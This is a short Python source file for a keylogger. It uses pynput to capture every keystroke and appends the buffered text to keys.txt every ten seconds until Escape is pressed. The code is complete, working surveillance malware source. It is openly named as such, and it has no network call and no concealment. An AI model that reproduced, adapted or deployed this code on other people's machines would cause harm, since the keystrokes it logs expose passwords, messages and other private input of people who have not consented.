from pynput import keyboard
import threading
import os

# Keystrokes storage and file location
text = ""  # Buffer to store keystrokes
file_path = "keys.txt"  # Path to the file
time_interval = 10  # Time interval for saving data to the file (in seconds)

def write_to_file():
    global text
    if text:  # Only write if there's data in the buffer
        try:
            with open(file_path, "a") as file:
                file.write(text + "\n")  # Write all buffered keystrokes and add a new line
            print(f"Data written to file: {text}")  # Confirmation message
            text = ""  # Clear the buffer after writing
        except Exception as e:
            print(f"Error writing to file: {e}")

def start_file_writer():
    write_to_file()  # Write to file every interval
    threading.Timer(time_interval, start_file_writer).start()

def on_press(key):
    global text
    try:
        # Append key representations to `text`
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key in {keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r}:
            pass  # Ignore shift and control keys
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]  # Remove last character on backspace
        elif key == keyboard.Key.esc:
            write_to_file()  # Save any remaining data before exiting
            return False  # Stop listener
        else:
            text += str(key).replace("'", "")  # Append the key pressed to `text`
    except Exception as e:
        print(f"Error processing key: {e}")

def start_keylogger():
    # Ensure the keystrokes file exists
    if not os.path.exists(file_path):
        open(file_path, "w").close()

    with keyboard.Listener(on_press=on_press) as listener:
        start_file_writer()  # Begin periodic file writing
        listener.join()